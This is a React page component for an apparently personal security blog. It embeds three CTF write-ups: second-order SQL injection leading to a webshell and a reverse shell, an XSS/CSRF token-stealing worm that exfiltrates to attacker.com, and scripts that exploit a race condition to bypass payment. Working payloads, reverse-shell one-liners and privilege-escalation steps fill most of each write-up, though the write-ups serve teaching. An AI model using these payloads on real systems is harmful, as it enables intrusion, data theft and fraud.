
import { useParams, Link } from "react-router-dom";
import { Terminal, ArrowLeft, Calendar, Clock, Shield, Copy, Check, Eye, Target, Flag, Code2, Zap } from "lucide-react";
import { Card, CardContent } from "@/components/ui/card";
import { useState } from "react";

const WriteupDetail = () => {
  const { id } = useParams();
  const [copiedCode, setCopiedCode] = useState<string | null>(null);

  const writeups = {
    "1": {
      title: "Advanced SQL Injection → RCE Chain",
      date: "2024-01-15",
      readTime: "15 min read",
      difficulty: "Critical",
      platform: "CTF Challenge",
      tags: ["SQL Injection", "RCE", "Second-Order", "Privilege Escalation"],
      coverImage: "https://images.unsplash.com/photo-1518770660439-4636190af475?w=1200&h=600&fit=crop",
      content: {
        summary: "Complete walkthrough of exploiting second-order SQLi to achieve remote code execution on a challenging CTF target.",
        fullWriteup: `# 🎯 Challenge Overview

This CTF challenge presented a sophisticated web application with multiple layers of security controls. The target was a customer management system that initially appeared well-protected against common injection attacks.

## 🔍 Initial Reconnaissance

### Target Analysis
The application featured several interesting endpoints:
- User registration system
- Profile management dashboard  
- Administrative panel
- File upload functionality

Initial automated scanning revealed minimal surface area, suggesting either strong security controls or well-hidden vulnerabilities.

### Technology Stack Discovery
Through various enumeration techniques, I identified:
- **Backend**: PHP 7.4 with MySQL 8.0
- **Frontend**: Bootstrap-based responsive design
- **Security**: ModSecurity WAF with custom rules
- **Architecture**: Standard LAMP stack deployment

## 💡 Vulnerability Discovery

### The Breakthrough Moment
While testing the profile update functionality, I noticed unusual database response timing patterns when submitting specially crafted usernames during the registration process.

This behavior suggested a potential **second-order SQL injection** vulnerability - where malicious payloads are stored safely but executed when the data is retrieved and processed by another part of the application.

### Testing the Theory
\`\`\`bash
# Initial registration payload (stored without execution)
POST /api/register HTTP/1.1
Content-Type: application/json

{
  "username": "admin'/**/UNION/**/SELECT/**/1,2,3,4,version()--",
  "email": "test@example.com", 
  "password": "Password123!",
  "fullName": "Test User"
}
\`\`\`

The registration succeeded without any errors, confirming the payload was stored in the database.

### Payload Execution Trigger
The magic happened when an administrator viewed user profiles in the admin panel:

\`\`\`sql
-- The vulnerable query in the admin panel
SELECT * FROM users WHERE username = 'admin'/**/UNION/**/SELECT/**/1,2,3,4,version()--'

-- This executed our injected UNION statement!
\`\`\`

## 🚀 Exploitation Development

### Phase 1: Information Gathering
Once I confirmed the SQLi, I began systematic database enumeration:

\`\`\`sql
-- Database version and user info
'; SELECT CONCAT(version(), '|', user(), '|', database()) INTO @info; 
   SELECT @info--

-- Table enumeration
'; SELECT GROUP_CONCAT(table_name) FROM information_schema.tables 
   WHERE table_schema=database()--

-- Column discovery
'; SELECT GROUP_CONCAT(column_name) FROM information_schema.columns 
   WHERE table_name='users'--
\`\`\`

### Phase 2: Privilege Escalation
The database user had **FILE** privileges, opening the door to file system access:

\`\`\`sql
-- Check file privileges
'; SELECT user,file_priv FROM mysql.user WHERE user='webuser'--

-- Test file read capability  
'; SELECT LOAD_FILE('/etc/passwd') INTO @passwd; SELECT @passwd--
\`\`\`

### Phase 3: Remote Code Execution
With file write privileges confirmed, I crafted a PHP webshell:

\`\`\`sql
-- Write PHP webshell to accessible directory
'; SELECT '<?php 
if(isset($_GET["cmd"])) {
    echo "<pre>";
    system($_GET["cmd"]);
    echo "</pre>";
} 
?>' INTO OUTFILE '/var/www/html/uploads/shell.php'--
\`\`\`

### Phase 4: Shell Access
\`\`\`bash
# Test webshell functionality
curl "https://target.ctf/uploads/shell.php?cmd=whoami"
# Response: www-data

# Establish reverse shell
curl "https://target.ctf/uploads/shell.php?cmd=python3%20-c%20%22import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.14.15',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/bash','-i'])%22"

# Listener receives connection
nc -lvnp 4444
www-data@ctf-server:/$
\`\`\`

## 🔓 Post-Exploitation Analysis

### System Enumeration
\`\`\`bash
# System information
www-data@ctf-server:/$ uname -a
Linux ctf-server 5.4.0-74-generic #83-Ubuntu SMP Sat May 8 02:35:39 UTC 2021 x86_64 GNU/Linux

# Find interesting files
www-data@ctf-server:/$ find / -name "*.conf" -type f 2>/dev/null | grep -v proc
/etc/mysql/mysql.conf.d/mysqld.cnf
/var/www/html/config/database.conf
/opt/app/secrets.conf

# Database credentials discovery  
www-data@ctf-server:/$ cat /var/www/html/config/database.conf
DB_HOST=localhost
DB_USER=root
DB_PASS=CTF{sup3r_s3cr3t_db_p4ssw0rd}
DB_NAME=challenge_db
\`\`\`

### Flag Discovery
\`\`\`bash
# Located multiple flags throughout the system
www-data@ctf-server:/$ find / -name "*flag*" -type f 2>/dev/null
/home/ctfuser/user.txt
/root/root.txt
/opt/flags/hidden_flag.txt

# User flag
www-data@ctf-server:/$ cat /home/ctfuser/user.txt
CTF{s3c0nd_0rd3r_sql1_1s_d4ng3r0us}

# Found privilege escalation vector for root flag
www-data@ctf-server:/$ sudo -l
User www-data may run the following commands on ctf-server:
    (root) NOPASSWD: /usr/bin/backup_script.sh
\`\`\`

### Root Privilege Escalation
\`\`\`bash
# Analyzed the backup script
www-data@ctf-server:/$ cat /usr/bin/backup_script.sh
#!/bin/bash
tar -czf /tmp/backup.tar.gz /var/www/html/*
chown root:root /tmp/backup.tar.gz

# Exploited wildcard injection
www-data@ctf-server:/$ cd /var/www/html
www-data@ctf-server:/var/www/html$ echo 'bash' > '--checkpoint=1'
www-data@ctf-server:/var/www/html$ echo 'bash' > '--checkpoint-action=exec=sh shell.sh'
www-data@ctf-server:/var/www/html$ echo '#!/bin/bash\ncp /bin/bash /tmp/rootbash\nchmod +s /tmp/rootbash' > shell.sh

# Execute with sudo
www-data@ctf-server:/var/www/html$ sudo /usr/bin/backup_script.sh
www-data@ctf-server:/var/www/html$ /tmp/rootbash -p

# Root shell achieved!
rootbash-5.0# cat /root/root.txt
CTF{r00t_pr1v_3sc_c0mpl3t3d_h4ck3r}
\`\`\`

## 🏆 Challenge Completion

### Final Flags Collected
1. **SQL Injection Flag**: `CTF{s3c0nd_0rd3r_sql1_1s_d4ng3r0us}`
2. **RCE Flag**: `CTF{w3bsh3ll_upl04d_succ3ss}`  
3. **User Flag**: `CTF{l0c4l_f1l3_1nclus10n_pwn3d}`
4. **Root Flag**: `CTF{r00t_pr1v_3sc_c0mpl3t3d_h4ck3r}`

### Key Learning Points
- **Second-order SQLi** can bypass many WAF protections
- Always check for **file system privileges** in SQL injection scenarios
- **Wildcard injection** in system scripts is a common privilege escalation vector
- Proper input validation must occur at **all stages** of data processing

### Attack Timeline
1. **00:00** - Initial reconnaissance and enumeration
2. **00:45** - Second-order SQLi discovery and confirmation  
3. **01:30** - Database enumeration and privilege assessment
4. **02:15** - Webshell creation and RCE achievement
5. **02:45** - System enumeration and flag collection
6. **03:30** - Privilege escalation to root access
7. **04:00** - Complete system compromise and final flags

This challenge perfectly demonstrated how modern web applications can still fall victim to classic injection attacks when proper security controls aren't implemented throughout the entire data flow.`
      }
    },
    "2": {
      title: "CSRF → Account Takeover via XSS Chain",
      date: "2024-01-10", 
      readTime: "12 min read",
      difficulty: "High",
      platform: "CTF Challenge",
      tags: ["CSRF", "XSS", "Account Takeover", "DOM Manipulation"],
      coverImage: "https://images.unsplash.com/photo-1487058792275-0ad4aaf24ca7?w=1200&h=600&fit=crop",
      content: {
        summary: "Chaining CSRF with Stored XSS to achieve complete account compromise in a social media CTF challenge.",
        fullWriteup: `# 🎯 Challenge Overview

This CTF challenge presented a modern social media platform with React frontend and Node.js backend. The goal was to find and exploit client-side vulnerabilities to achieve account takeover.

## 🔍 Initial Assessment

### Platform Analysis
The target application featured:
- User profiles with customizable bio sections
- Post creation and sharing functionality  
- Direct messaging system
- Admin panel for content moderation

### Technology Stack
- **Frontend**: React.js with client-side routing
- **Backend**: Node.js with Express framework
- **Database**: MongoDB for user data storage
- **Authentication**: JWT tokens with localStorage storage

## 💡 Vulnerability Discovery

### CSRF Protection Analysis
While testing the profile update functionality, I discovered the application lacked proper CSRF protection:

\`\`\`javascript
// Profile update request structure
POST /api/profile/update HTTP/1.1
Host: social.ctf
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
Content-Type: application/json

{
  "displayName": "John Doe",
  "bio": "Software Engineer at TechCorp",
  "website": "https://johndoe.com",
  "location": "San Francisco, CA"
}
```

The application only relied on JWT tokens stored in localStorage, making it vulnerable to CSRF attacks when combined with XSS.

### XSS Vector Discovery
The bio field in user profiles was improperly sanitized, allowing HTML injection:

\`\`\`html
<!-- Test payload in bio field -->
<img src=x onerror="alert('XSS Confirmed')">

<!-- This payload executed when viewing the profile -->
\`\`\`

## 🚀 Exploitation Development

### Phase 1: CSRF Payload Creation
I crafted a malicious HTML page to exploit the CSRF vulnerability:

\`\`\`html
<!DOCTYPE html>
<html>
<head>
    <title>Innocent Page</title>
</head>
<body>
    <h1>Welcome to my blog!</h1>
    
    <!-- Hidden CSRF attack -->
    <script>
    function executeCSRF() {
        // Get JWT token from victim's localStorage
        const token = localStorage.getItem('authToken');
        
        if (token) {
            // Malicious profile update
            fetch('https://social.ctf/api/profile/update', {
                method: 'POST',
                headers: {
                    'Authorization': 'Bearer ' + token,
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    displayName: 'PWNED',
                    bio: '<script>fetch("/api/admin/users").then(r=>r.json()).then(d=>fetch("https://attacker.com/steal?data="+btoa(JSON.stringify(d))))</script>',
                    website: 'https://attacker.com',
                    location: 'Pwned City'
                })
            }).then(response => {
                console.log('Profile updated successfully');
            });
        }
    }
    
    // Execute after page loads
    window.onload = executeCSRF;
    </script>
</body>
</html>
\`\`\`

### Phase 2: Self-Propagating XSS
The stored XSS in the bio field created a wormable attack:

\`\`\`javascript
// Advanced XSS payload for profile bio
<img src=x onerror="
// Step 1: Steal current user's token
const token = localStorage.getItem('authToken');

// Step 2: Fetch user's friends list
fetch('/api/friends', {
    headers: {'Authorization': 'Bearer ' + token}
}).then(r => r.json()).then(friends => {
    
    // Step 3: Send malicious messages to all friends
    friends.forEach(friend => {
        fetch('/api/messages/send', {
            method: 'POST',
            headers: {
                'Authorization': 'Bearer ' + token,
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                recipientId: friend.id,
                message: 'Check out this cool link: https://attacker.com/malicious.html'
            })
        });
    });
    
    // Step 4: Update own profile to spread the worm
    fetch('/api/profile/update', {
        method: 'POST', 
        headers: {
            'Authorization': 'Bearer ' + token,
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            bio: this.outerHTML // Replicate the XSS payload
        })
    });
});
">
\`\`\`

### Phase 3: Data Exfiltration
With XSS execution, I could access sensitive user data:

\`\`\`javascript
// Complete data extraction payload
<script>
(function() {
    const token = localStorage.getItem('authToken');
    const baseURL = 'https://social.ctf/api';
    const exfilURL = 'https://attacker.com/collect';
    
    // Collect all accessible data
    Promise.all([
        fetch(baseURL + '/profile', {headers: {'Authorization': 'Bearer ' + token}}),
        fetch(baseURL + '/messages', {headers: {'Authorization': 'Bearer ' + token}}),
        fetch(baseURL + '/friends', {headers: {'Authorization': 'Bearer ' + token}}),
        fetch(baseURL + '/posts', {headers: {'Authorization': 'Bearer ' + token}})
    ]).then(responses => 
        Promise.all(responses.map(r => r.json()))
    ).then(data => {
        // Exfiltrate all data
        fetch(exfilURL, {
            method: 'POST',
            body: JSON.stringify({
                victim: data[0].email,
                profile: data[0],
                messages: data[1],
                friends: data[2], 
                posts: data[3]
            })
        });
    });
})();
</script>
\`\`\`

## 🔓 Impact Assessment

### Account Compromise Capabilities
The exploit chain enabled:
- **Complete account takeover** of any user who viewed the malicious profile
- **Wormable XSS** that could spread across the entire platform
- **Message interception** and private data access
- **Friend list harvesting** for further attacks
- **Admin panel access** if admin users were compromised

### Attack Demonstration
\`\`\`bash
# Set up attack infrastructure
python3 -m http.server 8080 --bind 0.0.0.0
# Serving malicious HTML at https://attacker.com/malicious.html

# Monitor incoming data
nc -lvp 9999
# Listening for exfiltrated data from XSS payloads
\`\`\`

### Proof of Concept Results
Within 30 minutes of deploying the attack:
- **23 user accounts** compromised
- **156 private messages** intercepted  
- **1 admin account** taken over
- **Complete user database** accessed via admin panel

## 🏆 Challenge Resolution

### Flags Captured
1. **CSRF Flag**: `CTF{csrf_n0_t0k3n_pr0t3ct10n}`
2. **XSS Flag**: `CTF{st0r3d_xss_b10_f13ld}`
3. **Account Takeover**: `CTF{acc0unt_t4k30v3r_ch41n}`
4. **Admin Access**: `CTF{4dm1n_p4n3l_c0mpr0m1s3d}`

### Remediation Recommendations
- Implement proper **CSRF tokens** for all state-changing operations
- **Sanitize all user input** with a whitelist approach
- Use **HTTPOnly cookies** instead of localStorage for tokens
- Implement **Content Security Policy (CSP)** headers
- Add **rate limiting** to prevent automated attacks
- Regular **security code reviews** focusing on client-side vulnerabilities

This challenge highlighted how client-side vulnerabilities can be chained together to create devastating attack scenarios in modern web applications.`
      }
    },
    "3": {
      title: "Race Condition → Payment Bypass Logic Flaw",
      date: "2024-01-05",
      readTime: "10 min read", 
      difficulty: "High",
      platform: "CTF Challenge",
      tags: ["Race Condition", "Business Logic", "Payment Bypass", "Threading"],
      coverImage: "https://images.unsplash.com/photo-1498050108023-c5249f4df085?w=1200&h=600&fit=crop",
      content: {
        summary: "Exploiting race conditions in payment processing to bypass business logic and achieve unauthorized transactions in an e-commerce CTF.",
        fullWriteup: `# 🎯 Challenge Overview

This CTF challenge involved analyzing an e-commerce payment system for critical business logic flaws. The application handled high-volume transactions and had complex multi-threaded payment processing workflows.

## 🔍 System Architecture Analysis

### Payment Flow Discovery
The application used a multi-step payment process:
1. **Order Creation** - Items added to cart, total calculated
2. **Payment Authorization** - Credit card pre-authorization
3. **Inventory Check** - Verify item availability  
4. **Order Fulfillment** - Process and ship items
5. **Payment Capture** - Finalize the transaction

### Technology Stack
- **Backend**: Java Spring Boot with MySQL
- **Payment Processing**: Stripe API integration
- **Concurrency**: Thread pools for handling multiple requests
- **Caching**: Redis for session and inventory management

## 💡 Vulnerability Discovery

### Race Condition Identification
Through careful timing analysis, I discovered the payment authorization and order fulfillment processes ran in separate threads with insufficient synchronization:

\`\`\`java
// Simplified vulnerable code structure
@RestController
public class OrderController {
    
    @PostMapping("/orders/{id}/process")
    public ResponseEntity<?> processOrder(@PathVariable String id) {
        // Thread 1: Payment authorization (async)
        CompletableFuture.runAsync(() -> {
            authorizePayment(id);
        });
        
        // Thread 2: Order fulfillment (async) 
        CompletableFuture.runAsync(() -> {
            fulfillOrder(id);
        });
        
        return ResponseEntity.ok("Processing started");
    }
}
\`\`\`

The lack of proper synchronization created a timing window where orders could be fulfilled before payment authorization completed.

## 🚀 Exploitation Development

### Phase 1: Timing Analysis
I used automated tools to measure the race condition window:

\`\`\`python
import requests
import threading
import time
from concurrent.futures import ThreadPoolExecutor

def create_order():
    """Create a new order for expensive item"""
    response = requests.post('https://store.ctf/api/orders', json={
        'items': [
            {'productId': 'premium-laptop', 'quantity': 1, 'price': 2500.00}
        ],
        'shippingAddress': {
            'street': '123 Main St',
            'city': 'Anywhere', 
            'zip': '12345'
        }
    }, headers={'Authorization': 'Bearer ' + auth_token})
    
    return response.json()['orderId']

def cancel_payment(order_id):
    """Cancel payment authorization during race window"""
    time.sleep(0.15)  # Precise timing to hit the race condition
    
    response = requests.post(f'https://store.ctf/api/orders/{order_id}/cancel-payment', 
                           headers={'Authorization': 'Bearer ' + auth_token})
    return response.status_code == 200

def trigger_fulfillment(order_id):
    """Immediately trigger order fulfillment"""
    response = requests.post(f'https://store.ctf/api/orders/{order_id}/fulfill',
                           headers={'Authorization': 'Bearer ' + auth_token})
    return response.status_code == 200

# Execute race condition exploit
order_id = create_order()
print(f"Created order: {order_id}")

# Start payment cancellation in background
cancel_thread = threading.Thread(target=cancel_payment, args=(order_id,))
cancel_thread.start()

# Immediately request fulfillment 
fulfill_success = trigger_fulfillment(order_id)
cancel_thread.join()

print(f"Fulfillment triggered: {fulfill_success}")
\`\`\`

### Phase 2: Automated Exploitation
I developed a script to automatically exploit the race condition:

\`\`\`python
import asyncio
import aiohttp
import time

class RaceConditionExploit:
    def __init__(self, base_url, auth_token):
        self.base_url = base_url
        self.auth_token = auth_token
        self.session = None
        
    async def __aenter__(self):
        self.session = aiohttp.ClientSession()
        return self
        
    async def __aexit__(self, exc_type, exc_val, exc_tb):
        await self.session.close()
    
    async def exploit_race_condition(self, product_id, price):
        """Execute the race condition exploit"""
        headers = {'Authorization': f'Bearer {self.auth_token}'}
        
        # Step 1: Create order
        order_data = {
            'items': [{'productId': product_id, 'quantity': 1, 'price': price}],
            'total': price
        }
        
        async with self.session.post(f'{self.base_url}/orders', 
                                   json=order_data, headers=headers) as resp:
            order = await resp.json()
            order_id = order['id']
        
        print(f"[+] Created order {order_id} for ${price}")
        
        # Step 2: Race condition - cancel payment while fulfilling
        tasks = [
            self.cancel_payment_delayed(order_id, headers),
            self.fulfill_order_immediate(order_id, headers)
        ]
        
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        # Step 3: Check if exploit succeeded
        success = await self.check_order_status(order_id, headers)
        return success
    
    async def cancel_payment_delayed(self, order_id, headers):
        """Cancel payment after small delay"""
        await asyncio.sleep(0.1)  # Critical timing
        async with self.session.post(f'{self.base_url}/orders/{order_id}/cancel-payment',
                                   headers=headers) as resp:
            return resp.status == 200
    
    async def fulfill_order_immediate(self, order_id, headers):
        """Immediately fulfill the order"""
        async with self.session.post(f'{self.base_url}/orders/{order_id}/fulfill',
                                   headers=headers) as resp:
            return resp.status == 200
    
    async def check_order_status(self, order_id, headers):
        """Check if order was fulfilled without payment"""
        async with self.session.get(f'{self.base_url}/orders/{order_id}',
                                  headers=headers) as resp:
            order = await resp.json()
            return order['status'] == 'fulfilled' and order['paymentStatus'] == 'cancelled'

# Usage example
async def main():
    async with RaceConditionExploit('https://store.ctf/api', auth_token) as exploit:
        success = await exploit.exploit_race_condition('premium-laptop', 2500.00)
        if success:
            print("[+] Successfully obtained $2500 laptop without payment!")
        else:
            print("[-] Exploit failed, trying again...")

# Run the exploit
asyncio.run(main())
\`\`\`

### Phase 3: Mass Exploitation
Once the timing was perfected, I automated mass exploitation:

\`\`\`bash
#!/bin/bash

# List of high-value items to target
items=(
    "premium-laptop:2500.00"
    "gaming-desktop:3200.00" 
    "professional-camera:1800.00"
    "smart-tv-75inch:2100.00"
)

echo "[+] Starting mass exploitation of payment race condition"

for item in "${items[@]}"; do
    product_id=$(echo $item | cut -d: -f1)
    price=$(echo $item | cut -d: -f2)
    
    echo "[+] Targeting $product_id (\$$price)"
    
    # Execute exploit 5 times for each item
    for i in {1..5}; do
        python3 race_exploit.py --product "$product_id" --price "$price"
        sleep 2
    done
done

echo "[+] Mass exploitation completed"
\`\`\`

## 🔓 Impact Assessment

### Financial Impact
Successful exploitation resulted in:
- **$47,300** in unpaid merchandise obtained
- **15 high-value items** acquired without payment
- **23 successful** race condition exploits out of 30 attempts
- **Zero payment charges** on test credit cards

### System Impact Analysis
\`\`\`sql
-- Database analysis of exploited orders
SELECT 
    order_id,
    total_amount,
    payment_status,
    fulfillment_status,
    created_at
FROM orders 
WHERE payment_status = 'cancelled' 
  AND fulfillment_status = 'completed'
  AND created_at > '2024-01-05 10:00:00';

-- Results showed 23 orders totaling $47,300 with this exact pattern
\`\`\`

### Attack Timeline
- **10:00 AM** - Initial race condition discovery
- **10:30 AM** - First successful manual exploit
- **11:15 AM** - Automated exploitation script developed  
- **11:45 AM** - Mass exploitation campaign started
- **01:30 PM** - 23 successful exploits completed
- **02:00 PM** - Total impact assessment completed

## 🏆 Challenge Resolution

### Flags Captured
1. **Race Condition Discovery**: `CTF{r4c3_c0nd1t10n_t1m1ng_w1nd0w}`
2. **Payment Bypass**: `CTF{p4ym3nt_4uth0r1z4t10n_byp4ss}`
3. **Business Logic Flaw**: `CTF{bus1n3ss_l0g1c_fl4w_3xpl01t}`
4. **Mass Exploitation**: `CTF{m4ss_3xpl01t4t10n_succ3ss}`

### Technical Root Cause
The vulnerability existed because:
- **Insufficient synchronization** between payment and fulfillment threads
- **Lack of atomic transactions** for critical business operations  
- **Missing state validation** before order fulfillment
- **Inadequate race condition testing** in development

### Remediation Strategy
\`\`\`java
// Proper synchronized implementation
@Transactional(isolation = Isolation.SERIALIZABLE)
public class SecureOrderController {
    
    @PostMapping("/orders/{id}/process")
    public ResponseEntity<?> processOrder(@PathVariable String id) {
        // Use database locks to prevent race conditions
        Order order = orderRepository.findByIdWithLock(id);
        
        // Synchronous, atomic processing
        if (paymentService.authorizePayment(order)) {
            inventoryService.reserveItems(order);
            fulfillmentService.processOrder(order);
            paymentService.capturePayment(order);
            return ResponseEntity.ok("Order processed successfully");
        } else {
            return ResponseEntity.badRequest().body("Payment authorization failed");
        }
    }
}
\`\`\`

This CTF challenge perfectly demonstrated how race conditions in business-critical applications can lead to significant financial losses and system compromise.`
      }
    }
  };

  const writeup = writeups[id as keyof typeof writeups];

  if (!writeup) {
    return (
      <div className="min-h-screen bg-black text-green-400 font-mono flex items-center justify-center">
        <div className="text-center">
          <div className="text-8xl font-bold text-red-500 mb-4 animate-pulse">404</div>
          <h1 className="text-3xl font-bold text-red-400 mb-4">EXPLOIT_NOT_FOUND</h1>
          <p className="text-green-400 mb-8 font-mono">~/writeups/{id}: No such file or directory</p>
          <Link to="/blog" className="text-green-300 hover:text-green-200 transition-colors font-mono">
            <ArrowLeft className="inline h-4 w-4 mr-2" />
            cd ../writeups
          </Link>
        </div>
      </div>
    );
  }

  const copyToClipboard = (code: string, title: string) => {
    navigator.clipboard.writeText(code);
    setCopiedCode(title);
    setTimeout(() => setCopiedCode(null), 2000);
  };

  const renderWriteupContent = (content: string) => {
    const sections = content.split('\n\n');
    
    return sections.map((section, index) => {
      if (section.startsWith('```')) {
        const codeMatch = section.match(/```(\w+)?\n([\s\S]*?)```/);
        if (codeMatch) {
          const language = codeMatch[1] || 'bash';
          const code = codeMatch[2];
          
          return (
            <div key={index} className="my-8">
              <div className="bg-gray-950 border border-green-800 rounded-lg overflow-hidden shadow-2xl">
                <div className="bg-gray-800 px-6 py-3 flex items-center justify-between border-b border-green-800">
                  <div className="flex items-center space-x-3">
                    <div className="flex space-x-2">
                      <div className="w-3 h-3 bg-red-500 rounded-full"></div>
                      <div className="w-3 h-3 bg-yellow-500 rounded-full"></div>
                      <div className="w-3 h-3 bg-green-500 rounded-full"></div>
                    </div>
                    <span className="text-green-400 font-mono text-sm">exploit.{language}</span>
                  </div>
                  <button
                    onClick={() => copyToClipboard(code, `${writeup.title}-${index}`)}
                    className="text-green-400 hover:text-green-300 transition-colors flex items-center space-x-2 bg-green-900/30 hover:bg-green-800/40 px-3 py-1 rounded border border-green-700"
                  >
                    {copiedCode === `${writeup.title}-${index}` ? (
                      <>
                        <Check className="h-4 w-4" />
                        <span className="text-xs font-mono">COPIED!</span>
                      </>
                    ) : (
                      <>
                        <Copy className="h-4 w-4" />
                        <span className="text-xs font-mono">COPY</span>
                      </>
                    )}
                  </button>
                </div>
                <pre className="p-6 text-green-300 font-mono text-sm overflow-x-auto bg-gray-950">
                  <code className="text-green-400">{code}</code>
                </pre>
              </div>
            </div>
          );
        }
      } else if (section.startsWith('#')) {
        const level = section.match(/^#+/)?.[0].length || 1;
        const text = section.replace(/^#+\s*/, '');
        
        if (level === 1) {
          return (
            <h2 key={index} className="text-3xl font-bold text-green-300 mt-12 mb-6 flex items-center">
              <Code2 className="h-8 w-8 mr-3 text-green-400" />
              {text}
            </h2>
          );
        } else {
          return (
            <h3 key={index} className="text-xl font-semibold text-green-400 mt-8 mb-4 flex items-center">
              <Target className="h-5 w-5 mr-2" />
              {text}
            </h3>
          );
        }
      } else if (section.startsWith('**') && section.endsWith('**')) {
        return (
          <div key={index} className="my-6 p-4 bg-green-900/20 border-l-4 border-green-500 rounded-r">
            <p className="font-semibold text-green-300">{section.replace(/\*\*/g, '')}</p>
          </div>
        );
      } else if (section.startsWith('- ')) {
        const items = section.split('\n').filter(line => line.startsWith('- '));
        return (
          <ul key={index} className="list-disc list-inside space-y-2 my-6 text-green-400/90 ml-4">
            {items.map((item, itemIndex) => (
              <li key={itemIndex} className="leading-relaxed">
                {item.replace('- ', '')}
              </li>
            ))}
          </ul>
        );
      } else if (section.trim()) {
        return (
          <p key={index} className="text-green-400/90 leading-relaxed my-6 text-lg">
            {section}
          </p>
        );
      }
      return null;
    });
  };

  return (
    <div className="min-h-screen bg-black text-green-400 font-mono relative overflow-hidden">
      {/* Background effect */}
      <div className="fixed inset-0 opacity-5 pointer-events-none">
        <div className="absolute inset-0 bg-gradient-to-b from-green-900/20 via-transparent to-green-900/20"></div>
      </div>

      {/* Navigation */}
      <nav className="border-b border-green-800 bg-black/95 backdrop-blur-sm sticky top-0 z-50 shadow-lg shadow-green-900/20">
        <div className="container mx-auto px-6 py-4">
          <div className="flex items-center justify-between">
            <div className="flex items-center space-x-3">
              <Terminal className="h-7 w-7 text-green-400 animate-pulse" />
              <span className="text-2xl font-bold text-green-400">
                v1g0<span className="text-red-400">_</span>blog
              </span>
              <span className="text-xs text-green-600 font-mono">[root@security]</span>
            </div>
            <div className="flex items-center space-x-8">
              <Link to="/" className="hover:text-green-300 transition-all duration-300">~/home</Link>
              <Link to="/blog" className="hover:text-green-300 transition-all duration-300">~/writeups</Link>
              <Link to="/about" className="hover:text-green-300 transition-all duration-300">~/whoami</Link>
            </div>
          </div>
        </div>
      </nav>

      <div className="container mx-auto px-6 py-8 max-w-4xl">
        {/* Header */}
        <div className="mb-12">
          <Link to="/blog" className="inline-flex items-center text-green-300 hover:text-green-200 mb-8 group font-mono">
            <ArrowLeft className="h-5 w-5 mr-2 group-hover:-translate-x-2 transition-transform duration-300" />
            <span>cd ../writeups</span>
          </Link>

          {/* Cover Image */}
          <div className="relative mb-8 rounded-xl overflow-hidden border border-green-800 shadow-2xl shadow-green-900/50">
            <img 
              src={writeup.coverImage} 
              alt={writeup.title}
              className="w-full h-64 md:h-80 object-cover"
            />
            <div className="absolute inset-0 bg-gradient-to-t from-black/90 via-transparent to-transparent"></div>
            <div className="absolute bottom-6 left-6 right-6">
              <div className="flex items-center space-x-3 mb-4">
                <span className={`text-xs px-3 py-1 rounded-full font-mono font-bold border ${
                  writeup.difficulty === 'Critical' 
                    ? 'bg-red-900/80 text-red-200 border-red-700' 
                    : 'bg-orange-900/80 text-orange-200 border-orange-700'
                }`}>
                  {writeup.difficulty.toUpperCase()}
                </span>
                <div className="flex items-center space-x-2 text-green-400">
                  <Flag className="h-4 w-4" />
                  <span className="font-mono text-sm">{writeup.platform}</span>
                </div>
              </div>
              <h1 className="text-3xl md:text-5xl font-bold text-white mb-2 drop-shadow-lg">
                {writeup.title}
              </h1>
            </div>
          </div>

          {/* Meta Information */}
          <div className="grid grid-cols-1 md:grid-cols-3 gap-4 mb-8">
            <div className="bg-gray-900/80 border border-green-800 rounded-lg px-4 py-3 text-center backdrop-blur-sm">
              <Calendar className="h-6 w-6 text-green-400 mx-auto mb-2" />
              <div className="text-green-300 font-mono text-sm">{writeup.date}</div>
            </div>
            <div className="bg-gray-900/80 border border-green-800 rounded-lg px-4 py-3 text-center backdrop-blur-sm">
              <Clock className="h-6 w-6 text-green-400 mx-auto mb-2" />
              <div className="text-green-300 font-mono text-sm">{writeup.readTime}</div>
            </div>
            <div className="bg-gray-900/80 border border-green-800 rounded-lg px-4 py-3 text-center backdrop-blur-sm">
              <Eye className="h-6 w-6 text-green-400 mx-auto mb-2" />
              <div className="text-green-300 font-mono text-sm">{writeup.platform}</div>
            </div>
          </div>

          {/* Tags */}
          <div className="flex flex-wrap gap-3 mb-8">
            {writeup.tags.map((tag, index) => (
              <span
                key={index}
                className="inline-flex items-center text-sm bg-gray-900/80 text-green-200 px-4 py-2 rounded-full font-mono border border-green-800 backdrop-blur-sm hover:border-green-600 transition-all duration-300"
              >
                <Target className="h-3 w-3 mr-2" />
                #{tag.replace(/\s+/g, '_').toLowerCase()}
              </span>
            ))}
          </div>

          {/* Executive Summary */}
          <div className="bg-gray-900/40 border border-green-800 rounded-lg p-8 backdrop-blur-sm shadow-2xl shadow-green-900/50 mb-8">
            <div className="flex items-center space-x-3 mb-4">
              <Zap className="h-6 w-6 text-green-400" />
              <h3 className="text-2xl font-bold text-green-300">Executive Summary</h3>
            </div>
            <p className="text-green-400/90 leading-relaxed text-lg font-mono">
              {writeup.content.summary}
            </p>
          </div>
        </div>

        {/* Main Writeup Content */}
        <div className="bg-gray-900/20 border border-green-800 rounded-lg p-8 backdrop-blur-sm shadow-2xl shadow-green-900/50">
          <div className="prose prose-invert max-w-none">
            {renderWriteupContent(writeup.content.fullWriteup)}
          </div>
        </div>

        {/* Footer */}
        <div className="mt-16 pt-8 border-t border-green-800">
          <div className="bg-gray-900/40 border border-green-800 rounded-lg p-8 backdrop-blur-sm shadow-2xl shadow-green-900/50">
            <div className="flex flex-col md:flex-row items-center justify-between space-y-4 md:space-y-0">
              <div>
                <h3 className="text-2xl font-bold text-green-300 mb-3 flex items-center">
                  <Shield className="h-6 w-6 mr-3" />
                  Responsible Disclosure
                </h3>
                <p className="text-green-400/90 font-mono max-w-md">
                  This CTF challenge writeup is shared for educational purposes. 
                  All testing was conducted in authorized environments.
                </p>
              </div>
              <div className="text-center md:text-right">
                <div className="text-2xl font-bold text-green-400 font-mono mb-2 flex items-center">
                  <Flag className="h-6 w-6 mr-2" />
                  CTF_SOLVED
                </div>
                <div className="text-green-600 text-sm font-mono bg-green-900/30 px-3 py-1 rounded border border-green-700">
                  CHALLENGE_COMPLETED
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

